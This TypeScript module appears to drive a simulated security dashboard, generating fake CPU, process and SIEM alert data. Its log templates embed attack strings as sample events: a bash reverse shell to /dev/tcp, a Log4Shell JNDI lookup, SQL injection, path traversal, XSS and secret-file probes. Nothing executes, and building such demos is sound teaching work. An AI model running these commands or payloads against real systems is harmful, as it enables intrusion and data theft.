// Sugreev OS — simulated kernel telemetry engine.
// Produces live CPU / memory / network / process data and a stream of SIEM events & alerts.
// Everything here is SIMULATED, nothing touches the real network.
import { useSyncExternalStore } from "react";

export type Severity = "info" | "low" | "medium" | "high" | "critical";
export type LogSource = "auth" | "firewall" | "ids" | "web" | "endpoint" | "dns" | "kernel";

export interface Country {
  code: string;
  name: string;
  lat: number;
  lon: number;
  prefixes: number[];
}

export const COUNTRIES: Country[] = [
  { code: "RU", name: "Russia", lat: 55.7, lon: 37.6, prefixes: [91, 185, 95] },
  { code: "CN", name: "China", lat: 39.9, lon: 116.4, prefixes: [112, 117, 220] },
  { code: "KP", name: "North Korea", lat: 39.0, lon: 125.7, prefixes: [175] },
  { code: "IR", name: "Iran", lat: 35.7, lon: 51.4, prefixes: [5, 78] },
  { code: "BR", name: "Brazil", lat: -15.8, lon: -47.9, prefixes: [177, 189] },
  { code: "US", name: "United States", lat: 38.9, lon: -77.0, prefixes: [45, 104, 198] },
  { code: "DE", name: "Germany", lat: 52.5, lon: 13.4, prefixes: [85, 88] },
  { code: "NG", name: "Nigeria", lat: 9.1, lon: 7.4, prefixes: [41, 105] },
  { code: "VN", name: "Vietnam", lat: 21.0, lon: 105.8, prefixes: [14, 113] },
  { code: "UA", name: "Ukraine", lat: 50.4, lon: 30.5, prefixes: [93, 176] },
  { code: "RO", name: "Romania", lat: 44.4, lon: 26.1, prefixes: [89, 188] },
  { code: "NL", name: "Netherlands", lat: 52.4, lon: 4.9, prefixes: [31, 193] },
  { code: "PK", name: "Pakistan", lat: 33.7, lon: 73.1, prefixes: [39, 119] },
  { code: "AU", name: "Australia", lat: -33.9, lon: 151.2, prefixes: [1, 27] },
];

export const HOME_NODE = { name: "SGV-NODE-01", lat: 28.6, lon: 77.2 };

export interface LogEvent {
  id: number;
  ts: number;
  sev: Severity;
  source: LogSource;
  srcIp: string;
  dstIp: string;
  host: string;
  msg: string;
  rule?: string;
  mitre?: string;
  country?: string;
}

export type AlertStatus = "open" | "investigating" | "resolved" | "blocked";

export interface Alert {
  id: number;
  ts: number;
  sev: Severity;
  title: string;
  rule: string;
  mitre: string;
  srcIp: string;
  country: string;
  msg: string;
  status: AlertStatus;
}

export interface Proc {
  pid: number;
  name: string;
  user: string;
  cpu: number;
  mem: number; // MB
  state: string;
  cmd: string;
  threads: number;
  protected?: boolean;
}

export interface Conn {
  proto: string;
  local: string;
  remote: string;
  state: string;
  proc: string;
  pid: number;
}

export interface Attacker {
  ip: string;
  country: Country;
  count: number;
  blocked: boolean;
  last: number;
}

export interface Snapshot {
  tick: number;
  now: number;
  bootTime: number;
  cores: number;
  cpu: number[];
  cpuTotal: number;
  cpuHist: number[];
  coreHist: number[][];
  freq: number[];
  temp: number;
  tempHist: number[];
  load: [number, number, number];
  memUsed: number;
  memTotal: number;
  memCached: number;
  memHist: number[];
  swapUsed: number;
  swapTotal: number;
  rx: number;
  tx: number;
  rxHist: number[];
  txHist: number[];
  diskR: number;
  diskW: number;
  procs: Proc[];
  conns: Conn[];
  events: LogEvent[]; // newest first
  alerts: Alert[]; // newest first
  eps: number;
  epsHist: number[];
  sevCounts: Record<Severity, number>;
  srcCounts: Record<LogSource, number>;
  attackers: Attacker[];
  blockedIps: string[];
  threatLevel: number;
  totalEvents: number;
  autoBlock: boolean;
  surge: boolean;
}

export const CPU_INFO = {
  model: "Sugreev SG-8700X Cyber-Core Processor",
  vendor: "SugreevSilicon",
  arch: "x86_64",
  cores: 8,
  threads: 16,
  baseGhz: 3.8,
  boostGhz: 5.0,
  l1d: "256 KiB (8 instances)",
  l1i: "256 KiB (8 instances)",
  l2: "4 MiB (8 instances)",
  l3: "32 MiB (1 instance)",
  tdp: "105 W",
  flags:
    "fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ht syscall nx rdtscp lm constant_tsc rep_good nopl cpuid pni pclmulqdq ssse3 fma cx16 sse4_1 sse4_2 movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm abm avx2 bmi1 bmi2 smep smap sha_ni sgx_lc",
  vulnMitigations: [
    ["Spectre v1", "Mitigation: usercopy/swapgs barriers"],
    ["Spectre v2", "Mitigation: Enhanced IBRS, IBPB conditional"],
    ["Meltdown", "Not affected"],
    ["MDS", "Not affected"],
    ["L1TF", "Not affected"],
    ["Retbleed", "Mitigation: Enhanced IBRS"],
  ] as [string, string][],
};

const CORES = 8;
const HIST = 60;

const rnd = (a: number, b: number) => a + Math.random() * (b - a);
const rint = (a: number, b: number) => Math.floor(rnd(a, b + 1));
const clamp = (v: number, a: number, b: number) => Math.min(b, Math.max(a, v));
function pick<T>(a: T[]): T {
  return a[Math.floor(Math.random() * a.length)];
}
const push = (arr: number[], v: number) => {
  const n = arr.length >= HIST ? arr.slice(arr.length - HIST + 1) : arr.slice();
  n.push(v);
  return n;
};

/* ---------- event templates ---------- */
interface Ctx {
  ip: string;
  port: number;
  dom: string;
  user: string;
  n: number;
}
interface Tpl {
  w: number;
  source: LogSource;
  sev: Severity;
  external: boolean;
  rule?: string;
  mitre?: string;
  msg: (c: Ctx) => string;
}

const TEMPLATES: Tpl[] = [
  { w: 14, source: "kernel", sev: "info", external: false, msg: () => pick(["sugreev-kernel: cgroup memory pressure normal", "sugreev-kernel: NVMe SMART status OK (temp 41C)", "sugreev-kernel: apparmor profile sugreev-shell enforced", "sugreev-kernel: eth0 link up, 1000Mbps full duplex"]) },
  { w: 10, source: "auth", sev: "info", external: false, msg: (c) => `session opened for user ${pick(["vaibhav", "analyst", "svc-backup"])} by (uid=0) tty${c.n % 4}` },
  { w: 8, source: "endpoint", sev: "info", external: false, msg: () => pick(["FIM: integrity check passed for /etc/passwd", "FIM: integrity check passed for /etc/sudoers", "AV: clamd signature database up to date (v27412)", "cron: (root) CMD (/opt/sugreev/bin/log-rotate)"]) },
  { w: 6, source: "dns", sev: "info", external: false, msg: () => `query[A] ${pick(["updates.sugreev.os", "github.com", "nvd.nist.gov", "attack.mitre.org", "cdn.jsdelivr.net"])} from 10.0.0.${rint(3, 40)}` },
  { w: 12, source: "firewall", sev: "low", external: true, rule: "Port Scan Detected", mitre: "T1046", msg: (c) => `UFW BLOCK IN=eth0 SRC=${c.ip} DST=10.0.0.5 PROTO=TCP SPT=${rint(1024, 65000)} DPT=${c.port}` },
  { w: 8, source: "auth", sev: "medium", external: true, rule: "SSH Brute Force", mitre: "T1110.001", msg: (c) => `sshd[${rint(1000, 9000)}]: Failed password for ${c.user} from ${c.ip} port ${rint(20000, 60000)} ssh2` },
  { w: 3, source: "auth", sev: "high", external: true, rule: "Credential Stuffing", mitre: "T1110.004", msg: (c) => `pam_unix(sshd:auth): ${rint(25, 140)} authentication failures; rhost=${c.ip} user=${c.user}` },
  { w: 1, source: "auth", sev: "critical", external: true, rule: "Successful Login After Brute Force", mitre: "T1078", msg: (c) => `sshd: Accepted password for ${c.user} from ${c.ip} after ${rint(40, 300)} failed attempts` },
  { w: 5, source: "ids", sev: "medium", external: true, rule: "Recon Tool Fingerprint", mitre: "T1595.002", msg: (c) => `[IDS] ET SCAN ${pick(["Nmap Scripting Engine", "Nikto Web Scanner", "sqlmap", "Masscan"])} User-Agent detected {${c.ip} -> 10.0.0.5:${pick([80, 443, 8080])}}` },
  { w: 2, source: "ids", sev: "critical", external: true, rule: "Log4Shell RCE Attempt", mitre: "T1190", msg: (c) => `[IDS] ET EXPLOIT Apache Log4j RCE Attempt (CVE-2021-44228) \${jndi:ldap://${c.dom}/a} from ${c.ip}` },
  { w: 2, source: "ids", sev: "high", external: true, rule: "Exploit Kit / Shellcode", mitre: "T1203", msg: (c) => `[IDS] GPL SHELLCODE x86 NOOP sled detected {${c.ip} -> 10.0.0.12:445}` },
  { w: 5, source: "web", sev: "high", external: true, rule: "SQL Injection", mitre: "T1190", msg: (c) => `nginx: ${c.ip} "GET /products.php?id=1' OR '1'='1'-- HTTP/1.1" 500 WAF:SQLi-942100` },
  { w: 4, source: "web", sev: "medium", external: true, rule: "Directory Traversal", mitre: "T1083", msg: (c) => `nginx: ${c.ip} "GET /static/..%2f..%2f..%2fetc/passwd HTTP/1.1" 403 WAF:LFI-930120` },
  { w: 4, source: "web", sev: "medium", external: true, rule: "Reflected XSS", mitre: "T1059.007", msg: (c) => `nginx: ${c.ip} "GET /search?q=<script>alert(1)</script> HTTP/1.1" 400 WAF:XSS-941100` },
  { w: 3, source: "web", sev: "low", external: true, rule: "Sensitive File Probe", mitre: "T1083", msg: (c) => `nginx: ${c.ip} "GET ${pick(["/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/", "/backup.zip"])} HTTP/1.1" 404` },
  { w: 2, source: "endpoint", sev: "critical", external: false, rule: "Reverse Shell Spawned", mitre: "T1059.004", msg: (c) => `auditd: execve bash -i >& /dev/tcp/${c.ip}/${rint(4000, 4999)} 0>&1 by uid=33(www-data)` },
  { w: 2, source: "endpoint", sev: "high", external: false, rule: "Suspicious SUID Binary", mitre: "T1548.001", msg: () => `FIM: new SUID binary detected /tmp/.${pick(["x", "cache", "pwn"])}${rint(1, 9)} (mode 4755)` },
  { w: 2, source: "endpoint", sev: "medium", external: false, rule: "Persistence via Cron", mitre: "T1053.003", msg: () => `FIM: /etc/cron.d/${pick(["update", "sys-check", ".hidden"])} modified by uid=33` },
  { w: 3, source: "dns", sev: "high", external: true, rule: "C2 Beaconing (DNS)", mitre: "T1071.004", msg: (c) => `DNS query to known C2 domain ${c.dom} from 10.0.0.${rint(3, 40)} (TI match: APT-Sim-${rint(1, 9)})` },
  { w: 3, source: "dns", sev: "low", external: false, rule: "DGA-like Domain", mitre: "T1568.002", msg: () => `DNS query ${Math.random().toString(36).slice(2, 14)}.${pick(["xyz", "top", "click"])} entropy=3.9 from 10.0.0.${rint(3, 40)}` },
  { w: 2, source: "firewall", sev: "medium", external: true, rule: "Outbound Data Exfil", mitre: "T1041", msg: (c) => `UFW AUDIT OUT=eth0 SRC=10.0.0.${rint(3, 40)} DST=${c.ip} LEN=${rint(40000, 65000)} DPT=443 (${rint(80, 480)}MB in 60s)` },
];

const DOMAINS = ["update-sec.xyz", "cdn-static-live.top", "kx3-relay.click", "mailer-gate.cc", "dl-assets.ru", "ns1.badcloud.io"];
const USERS = ["root", "admin", "ubuntu", "oracle", "postgres", "test", "pi", "git", "deploy"];
const PORTS = [21, 22, 23, 25, 80, 135, 139, 443, 445, 1433, 3306, 3389, 5432, 5900, 6379, 8080, 9200, 27017];

/* ---------- state ---------- */
let eventId = 1000;
let alertId = 500;
let drift = 22;
let spike = 0;
let surgeLeft = 0;
let timer: ReturnType<typeof setInterval> | null = null;
let listeners = new Set<() => void>();
let appProcs: Omit<Proc, "cpu">[] = [];

let attackerPool: { ip: string; country: Country }[] = [];

function mkIp(c: Country) {
  return `${pick(c.prefixes)}.${rint(1, 254)}.${rint(1, 254)}.${rint(1, 254)}`;
}
function buildPool() {
  attackerPool = Array.from({ length: 18 }, () => {
    const country = pick(COUNTRIES);
    return { ip: mkIp(country), country };
  });
}

const BASE_PROCS: Omit<Proc, "cpu">[] = [
  { pid: 1, name: "systemd", user: "root", mem: 14, state: "S", cmd: "/sbin/init splash", threads: 1, protected: true },
  { pid: 2, name: "kthreadd", user: "root", mem: 0, state: "S", cmd: "[kthreadd]", threads: 1, protected: true },
  { pid: 214, name: "sugreev-journald", user: "root", mem: 48, state: "S", cmd: "/usr/lib/sugreev/journald", threads: 1, protected: true },
  { pid: 312, name: "sugreev-udevd", user: "root", mem: 12, state: "S", cmd: "/usr/lib/sugreev/udevd --daemon", threads: 1, protected: true },
  { pid: 412, name: "sgv-siemd", user: "root", mem: 612, state: "S", cmd: "/opt/sugreev/siem/siemd --config /etc/sugreev/siem.conf", threads: 14 },
  { pid: 418, name: "sgv-ids", user: "root", mem: 940, state: "R", cmd: "/opt/sugreev/ids/sgv-ids -i eth0 -c ids.yaml", threads: 9 },
  { pid: 421, name: "sgv-firewalld", user: "root", mem: 36, state: "S", cmd: "/usr/sbin/sgv-firewalld --nofork", threads: 3 },
  { pid: 455, name: "sshd", user: "root", mem: 9, state: "S", cmd: "sshd: /usr/sbin/sshd -D [listener]", threads: 1 },
  { pid: 502, name: "NetworkManager", user: "root", mem: 31, state: "S", cmd: "/usr/sbin/NetworkManager --no-daemon", threads: 3 },
  { pid: 530, name: "dbus-daemon", user: "messagebus", mem: 6, state: "S", cmd: "dbus-daemon --system --address=systemd:", threads: 1 },
  { pid: 611, name: "sugreev-shell", user: "vaibhav", mem: 188, state: "S", cmd: "/usr/bin/sugreev-shell --session", threads: 8 },
  { pid: 788, name: "sgv-compositor", user: "vaibhav", mem: 266, state: "R", cmd: "/usr/bin/sgv-compositor --glass", threads: 6 },
  { pid: 1204, name: "nginx", user: "www-data", mem: 54, state: "S", cmd: "nginx: worker process", threads: 4 },
  { pid: 1230, name: "postgres", user: "postgres", mem: 212, state: "S", cmd: "/usr/lib/postgresql/16/bin/postgres -D /var/lib/postgresql/16/main", threads: 1 },
  { pid: 1301, name: "fail2ban-server", user: "root", mem: 41, state: "S", cmd: "/usr/bin/python3 /usr/bin/fail2ban-server -xf start", threads: 5 },
  { pid: 1305, name: "cron", user: "root", mem: 3, state: "S", cmd: "/usr/sbin/cron -f", threads: 1 },
  { pid: 1402, name: "auditd", user: "root", mem: 22, state: "S", cmd: "/sbin/auditd", threads: 2 },
  { pid: 1480, name: "clamd", user: "clamav", mem: 704, state: "S", cmd: "/usr/sbin/clamd --foreground=true", threads: 3 },
  { pid: 1533, name: "sgv-threatintel", user: "root", mem: 128, state: "S", cmd: "/opt/sugreev/ti/feedd --sync 300", threads: 4 },
  { pid: 1602, name: "sgv-vapt-engine", user: "vaibhav", mem: 156, state: "S", cmd: "/opt/sugreev/vapt/engine --sandbox", threads: 6 },
];
const BASE_W: Record<number, number> = { 1: 1, 2: 0.2, 214: 1, 312: 0.4, 412: 9, 418: 14, 421: 1.5, 455: 0.5, 502: 1, 530: 0.6, 611: 4, 788: 7, 1204: 2, 1230: 3, 1301: 1.4, 1305: 0.2, 1402: 0.8, 1480: 3, 1533: 2, 1602: 2.5 };

let removedPids = new Set<number>();
let blocked: string[] = [];
let autoBlock = false;

let S: Snapshot;

function buildConns(): Conn[] {
  return [
    { proto: "tcp", local: "0.0.0.0:22", remote: "0.0.0.0:*", state: "LISTEN", proc: "sshd", pid: 455 },
    { proto: "tcp", local: "0.0.0.0:80", remote: "0.0.0.0:*", state: "LISTEN", proc: "nginx", pid: 1204 },
    { proto: "tcp", local: "0.0.0.0:443", remote: "0.0.0.0:*", state: "LISTEN", proc: "nginx", pid: 1204 },
    { proto: "tcp", local: "127.0.0.1:5432", remote: "0.0.0.0:*", state: "LISTEN", proc: "postgres", pid: 1230 },
    { proto: "tcp", local: "127.0.0.1:8443", remote: "0.0.0.0:*", state: "LISTEN", proc: "sgv-siemd", pid: 412 },
    { proto: "tcp", local: "127.0.0.1:3310", remote: "0.0.0.0:*", state: "LISTEN", proc: "clamd", pid: 1480 },
    { proto: "udp", local: "0.0.0.0:68", remote: "0.0.0.0:*", state: "UNCONN", proc: "NetworkManager", pid: 502 },
    { proto: "udp", local: "127.0.0.53:53", remote: "0.0.0.0:*", state: "UNCONN", proc: "systemd-resolve", pid: 214 },
    { proto: "tcp", local: "10.0.0.5:22", remote: "10.0.0.21:51822", state: "ESTAB", proc: "sshd", pid: 455 },
    { proto: "tcp", local: "10.0.0.5:44312", remote: "140.82.112.4:443", state: "ESTAB", proc: "sgv-threatintel", pid: 1533 },
    { proto: "tcp", local: "10.0.0.5:51200", remote: "151.101.1.69:443", state: "ESTAB", proc: "sugreev-shell", pid: 611 },
    { proto: "tcp", local: "10.0.0.5:39014", remote: "104.18.22.7:443", state: "TIME_WAIT", proc: "sugreev-shell", pid: 611 },
  ];
}

function emptySev(): Record<Severity, number> {
  return { info: 0, low: 0, medium: 0, high: 0, critical: 0 };
}
function emptySrc(): Record<LogSource, number> {
  return { auth: 0, firewall: 0, ids: 0, web: 0, endpoint: 0, dns: 0, kernel: 0 };
}

function pickAttacker() {
  const pool = attackerPool.filter((a) => !blocked.includes(a.ip));
  if (pool.length < 6) {
    const c = pick(COUNTRIES);
    attackerPool.push({ ip: mkIp(c), country: c });
    return attackerPool[attackerPool.length - 1];
  }
  return pick(pool);
}

function genEvent(ts: number): LogEvent {
  const total = TEMPLATES.reduce((s, t) => s + (surgeLeft > 0 && t.external ? t.w * 2 : t.w), 0);
  let r = Math.random() * total;
  let tpl = TEMPLATES[0];
  for (const t of TEMPLATES) {
    r -= surgeLeft > 0 && t.external ? t.w * 2 : t.w;
    if (r <= 0) {
      tpl = t;
      break;
    }
  }
  const att = tpl.external ? pickAttacker() : null;
  const srcIp = att ? att.ip : `10.0.${rint(0, 1)}.${rint(3, 60)}`;
  const ctx: Ctx = { ip: srcIp, port: pick(PORTS), dom: pick(DOMAINS), user: pick(USERS), n: rint(0, 9) };
  return {
    id: ++eventId,
    ts,
    sev: tpl.sev,
    source: tpl.source,
    srcIp,
    dstIp: "10.0.0." + pick(["5", "12", "21", "30"]),
    host: "sgv-node-01",
    msg: tpl.msg(ctx),
    rule: tpl.rule,
    mitre: tpl.mitre,
    country: att?.country.code,
  };
}

function maybeAlert(ev: LogEvent, alerts: Alert[], force = false): Alert[] {
  const chance = ev.sev === "critical" ? 0.35 : ev.sev === "high" ? 0.12 : ev.sev === "medium" ? 0.03 : 0;
  if (!ev.rule || (!force && Math.random() > chance)) return alerts;
  const dup = alerts.find((a) => a.rule === ev.rule && (a.srcIp === ev.srcIp || Math.abs(ev.ts - a.ts) < 45000) && a.status === "open");
  if (dup) return alerts;
  const status: AlertStatus = blocked.includes(ev.srcIp) ? "blocked" : "open";
  const a: Alert = { id: ++alertId, ts: ev.ts, sev: ev.sev, title: ev.rule, rule: ev.rule, mitre: ev.mitre || "T1190", srcIp: ev.srcIp, country: ev.country || "--", msg: ev.msg, status };
  return [a, ...alerts].slice(0, 80);
}

function threatFrom(alerts: Alert[], surge: boolean) {
  const now = Date.now();
  let sc = 0;
  for (const a of alerts) {
    if (a.status !== "open" && a.status !== "investigating") continue;
    const age = Math.max(0, (now - a.ts) / 1000);
    const decay = Math.max(0.2, 1 - age / 420);
    sc += (a.sev === "critical" ? 7 : a.sev === "high" ? 3.5 : a.sev === "medium" ? 1 : 0.2) * decay;
  }
  return clamp(Math.round(sc + (surge ? 10 : 0)), 3, 100);
}

function attackersFrom(events: LogEvent[]): Attacker[] {
  const m = new Map<string, Attacker>();
  for (const e of events) {
    if (!e.country || e.sev === "info") continue;
    const c = COUNTRIES.find((x) => x.code === e.country);
    if (!c) continue;
    const cur = m.get(e.srcIp);
    if (cur) {
      cur.count++;
      cur.last = Math.max(cur.last, e.ts);
    } else m.set(e.srcIp, { ip: e.srcIp, country: c, count: 1, blocked: blocked.includes(e.srcIp), last: e.ts });
  }
  return [...m.values()].sort((a, b) => b.count - a.count).slice(0, 12);
}

function recount(events: LogEvent[]) {
  const sev = emptySev();
  const src = emptySrc();
  for (const e of events) {
    sev[e.sev]++;
    src[e.source]++;
  }
  return { sev, src };
}

function init() {
  buildPool();
  removedPids = new Set();
  blocked = [];
  eventId = 1000;
  alertId = 500;
  drift = 22;
  const now = Date.now();
  let events: LogEvent[] = [];
  let alerts: Alert[] = [];
  for (let i = 90; i > 0; i--) {
    const e = genEvent(now - i * 4000);
    events = [e, ...events];
    alerts = maybeAlert(e, alerts);
  }
  // make sure the dashboard has something interesting from the start
  for (let g = 0; alerts.length < 9 && g < 400; g++) {
    const e = genEvent(now - rint(5, 340) * 1000);
    if (e.rule && e.sev !== "low" && e.sev !== "info") {
      events = [...events, e].sort((a, b) => b.ts - a.ts);
      alerts = maybeAlert(e, alerts, true);
    }
  }
  alerts = alerts.sort((a, b) => b.ts - a.ts);
  alerts = alerts.slice(0, 14).map((a, i) => (i < 3 ? a : { ...a, status: (i % 4 === 0 ? "investigating" : "resolved") as AlertStatus }));
  const { sev, src } = recount(events);
  const cpu = Array.from({ length: CORES }, () => rnd(8, 30));
  S = {
    tick: 0,
    now,
    bootTime: now,
    cores: CORES,
    cpu,
    cpuTotal: cpu.reduce((a, b) => a + b, 0) / CORES,
    cpuHist: Array.from({ length: HIST }, () => rnd(12, 28)),
    coreHist: cpu.map(() => Array.from({ length: HIST }, () => rnd(5, 35))),
    freq: cpu.map(() => rnd(3.6, 4.2)),
    temp: 44,
    tempHist: Array.from({ length: HIST }, () => rnd(40, 48)),
    load: [0.6, 0.7, 0.55],
    memUsed: 5600,
    memTotal: 16384,
    memCached: 4100,
    memHist: Array.from({ length: HIST }, () => rnd(5400, 5800)),
    swapUsed: 128,
    swapTotal: 4096,
    rx: 240,
    tx: 90,
    rxHist: Array.from({ length: HIST }, () => rnd(80, 400)),
    txHist: Array.from({ length: HIST }, () => rnd(30, 160)),
    diskR: 12,
    diskW: 6,
    procs: [],
    conns: buildConns(),
    events,
    alerts,
    eps: 3,
    epsHist: Array.from({ length: HIST }, () => rint(1, 6)),
    sevCounts: sev,
    srcCounts: src,
    attackers: attackersFrom(events),
    blockedIps: [],
    threatLevel: threatFrom(alerts, false),
    totalEvents: events.length + 48210,
    autoBlock,
    surge: false,
  };
  S.procs = computeProcs(S.cpuTotal);
}

function computeProcs(cpuTotal: number): Proc[] {
  const all = [...BASE_PROCS.filter((p) => !removedPids.has(p.pid)), ...appProcs] as (Omit<Proc, "cpu"> & { cpu?: number })[];
  const ws = all.map((p) => (BASE_W[p.pid] ?? 1.5) * rnd(0.6, 1.5));
  const sum = ws.reduce((a, b) => a + b, 0) || 1;
  const budget = cpuTotal * CORES;
  return all
    .map((p, i) => ({ ...p, cpu: Math.round((ws[i] / sum) * budget * 10) / 10 }) as Proc)
    .sort((a, b) => b.cpu - a.cpu);
}

function tick() {
  const now = Date.now();
  if (surgeLeft > 0) surgeLeft--;
  else if (Math.random() < 0.025) surgeLeft = rint(6, 10);
  drift = clamp(drift + rnd(-5, 5), 8, 48);
  if (Math.random() < 0.06) spike = rnd(20, 38);
  spike *= 0.6;
  const cpu = S.cpu.map((c, i) => clamp(c * 0.5 + (drift + rnd(-12, 12) + (i % 3 === 0 ? 8 : 0) + spike) * 0.5, 1, 100));
  const cpuTotal = cpu.reduce((a, b) => a + b, 0) / CORES;
  const freq = cpu.map((c) => clamp(3.6 + (c / 100) * 1.4 + rnd(-0.1, 0.1), 3.4, 5.0));
  const temp = clamp(40 + cpuTotal * 0.42 + rnd(-1, 1), 36, 92);

  const n = (Math.random() < 0.7 ? rint(0, 3) : rint(1, 5)) + (surgeLeft > 0 ? rint(3, 6) : 0);
  let events = S.events;
  let alerts = S.alerts;
  const fresh: LogEvent[] = [];
  for (let i = 0; i < n; i++) {
    const e = genEvent(now - i * 100);
    fresh.unshift(e);
  }
  // blocked ips occasionally hit the firewall again
  if (blocked.length && Math.random() < 0.25) {
    const ip = pick(blocked);
    fresh.push({ id: ++eventId, ts: now, sev: "low", source: "firewall", srcIp: ip, dstIp: "10.0.0.5", host: "sgv-node-01", msg: `UFW BLOCK IN=eth0 SRC=${ip} DST=10.0.0.5 PROTO=TCP DPT=${pick(PORTS)} (blocklist hit)`, rule: "Blocklist Hit", mitre: "T1046", country: S.attackers.find((a) => a.ip === ip)?.country.code });
  }
  for (const e of fresh) {
    alerts = maybeAlert(e, alerts);
    if (autoBlock && e.sev === "critical" && e.country && !blocked.includes(e.srcIp)) {
      blocked = [...blocked, e.srcIp];
      alerts = alerts.map((a) => (a.srcIp === e.srcIp ? { ...a, status: "blocked" as AlertStatus } : a));
      fresh.push({ id: ++eventId, ts: now, sev: "info", source: "firewall", srcIp: "10.0.0.5", dstIp: e.srcIp, host: "sgv-node-01", msg: `SIEM auto-response: blocked ${e.srcIp} (policy: critical -> block)` });
    }
  }
  alerts = alerts.map((a) => (a.status === "open" && (((a.sev === "medium" || a.sev === "low") && now - a.ts > 90000) || (a.sev === "high" && now - a.ts > 240000)) ? { ...a, status: "resolved" as AlertStatus } : a));
  events = [...fresh.reverse(), ...events].slice(0, 500);
  const { sev, src } = recount(events);
  const memUsed = clamp(5600 + Math.sin(now / 30000) * 240 + cpuTotal * 6 + rnd(-25, 25), 4000, 12000);
  const rx = clamp(S.rx * 0.5 + rnd(60, 520) * 0.5 + (surgeLeft > 0 ? rnd(300, 1500) : 0), 10, 9000);
  const tx = clamp(S.tx * 0.5 + rnd(20, 220) * 0.5, 5, 3000);
  const l1 = S.load[0] * 0.9 + (cpuTotal / 100) * CORES * 0.1;

  S = {
    ...S,
    tick: S.tick + 1,
    now,
    cpu,
    cpuTotal,
    cpuHist: push(S.cpuHist, cpuTotal),
    coreHist: S.coreHist.map((h, i) => push(h, cpu[i])),
    freq,
    temp,
    tempHist: push(S.tempHist, temp),
    load: [l1, S.load[1] * 0.97 + l1 * 0.03, S.load[2] * 0.99 + l1 * 0.01],
    memUsed,
    memHist: push(S.memHist, memUsed),
    memCached: 4100 + Math.sin(now / 50000) * 200,
    swapUsed: clamp(S.swapUsed + rnd(-2, 3), 100, 400),
    rx,
    tx,
    rxHist: push(S.rxHist, rx),
    txHist: push(S.txHist, tx),
    diskR: clamp(rnd(0, 40) + (spike > 5 ? 60 : 0), 0, 300),
    diskW: clamp(rnd(0, 25), 0, 200),
    procs: computeProcs(cpuTotal),
    events,
    alerts,
    eps: fresh.length,
    epsHist: push(S.epsHist, fresh.length),
    sevCounts: sev,
    srcCounts: src,
    attackers: attackersFrom(events),
    blockedIps: blocked,
    threatLevel: Math.round(S.threatLevel * 0.6 + threatFrom(alerts, surgeLeft > 0) * 0.4),
    totalEvents: S.totalEvents + fresh.length,
    autoBlock,
    surge: surgeLeft > 0,
  };
  emit();
}

function emit() {
  listeners.forEach((l) => l());
}

/* ---------- public API ---------- */
export function startKernel() {
  if (timer) return;
  init();
  timer = setInterval(tick, 1000);
  emit();
}
export function stopKernel() {
  if (timer) clearInterval(timer);
  timer = null;
}
function ensure() {
  if (!S) init();
}
export function getSnapshot(): Snapshot {
  ensure();
  return S;
}
export function subscribe(cb: () => void) {
  listeners.add(cb);
  return () => {
    listeners.delete(cb);
  };
}
export function useKernel(): Snapshot {
  return useSyncExternalStore(subscribe, getSnapshot, getSnapshot);
}

export function blockIp(ip: string) {
  ensure();
  if (blocked.includes(ip)) return;
  blocked = [...blocked, ip];
  S = {
    ...S,
    blockedIps: blocked,
    alerts: S.alerts.map((a) => (a.srcIp === ip ? { ...a, status: "blocked" as AlertStatus } : a)),
    events: [{ id: ++eventId, ts: Date.now(), sev: "info" as Severity, source: "firewall" as LogSource, srcIp: "10.0.0.5", dstIp: ip, host: "sgv-node-01", msg: `ufw insert 1 deny from ${ip} to any  (added by SIEM operator)` }, ...S.events],
    attackers: S.attackers.map((a) => (a.ip === ip ? { ...a, blocked: true } : a)),
  };
  emit();
}
export function unblockIp(ip: string) {
  ensure();
  blocked = blocked.filter((b) => b !== ip);
  S = { ...S, blockedIps: blocked, attackers: S.attackers.map((a) => (a.ip === ip ? { ...a, blocked: false } : a)) };
  emit();
}
export function setAlertStatus(id: number, status: AlertStatus) {
  ensure();
  S = { ...S, alerts: S.alerts.map((a) => (a.id === id ? { ...a, status } : a)) };
  S = { ...S, threatLevel: threatFrom(S.alerts, S.surge) };
  emit();
}
export function resolveAllAlerts() {
  ensure();
  S = { ...S, alerts: S.alerts.map((a) => (a.status === "open" || a.status === "investigating" ? { ...a, status: "resolved" as AlertStatus } : a)) };
  S = { ...S, threatLevel: threatFrom(S.alerts, S.surge) };
  emit();
}
export function killProc(pid: number): "ok" | "denied" | "none" {
  ensure();
  const p = S.procs.find((x) => x.pid === pid);
  if (!p) return "none";
  if (p.protected) return "denied";
  if (appProcs.some((a) => a.pid === pid)) return "denied";
  removedPids.add(pid);
  S = { ...S, procs: S.procs.filter((x) => x.pid !== pid) };
  emit();
  return "ok";
}
export function setAutoBlock(v: boolean) {
  autoBlock = v;
  ensure();
  S = { ...S, autoBlock: v };
  emit();
}
export function injectEvent(e: Partial<LogEvent> & { msg: string }) {
  ensure();
  const ev: LogEvent = { id: ++eventId, ts: Date.now(), sev: "info", source: "kernel", srcIp: "10.0.0.5", dstIp: "10.0.0.5", host: "sgv-node-01", ...e };
  S = { ...S, events: [ev, ...S.events].slice(0, 500), totalEvents: S.totalEvents + 1 };
  emit();
}
export function setAppProcs(list: { id: string; app: string }[]) {
  appProcs = list.map((w, i) => ({ pid: 3000 + i * 7, name: `sgv-app-${w.app}`, user: "vaibhav", mem: 60 + (w.app.length * 13) % 140, state: "S", cmd: `/usr/bin/sgv-app --id ${w.app} --win ${w.id}`, threads: 4, protected: true }));
}
export function threatLabel(level: number): { label: string; color: string } {
  if (level < 15) return { label: "LOW", color: "#00ffa3" };
  if (level < 35) return { label: "GUARDED", color: "#38bdf8" };
  if (level < 60) return { label: "ELEVATED", color: "#ffb020" };
  if (level < 80) return { label: "HIGH", color: "#ff7a3c" };
  return { label: "SEVERE", color: "#ff3b5c" };
}
export const SEV_COLOR: Record<Severity, string> = {
  info: "#6b8aa3",
  low: "#38bdf8",
  medium: "#ffb020",
  high: "#ff7a3c",
  critical: "#ff3b5c",
};
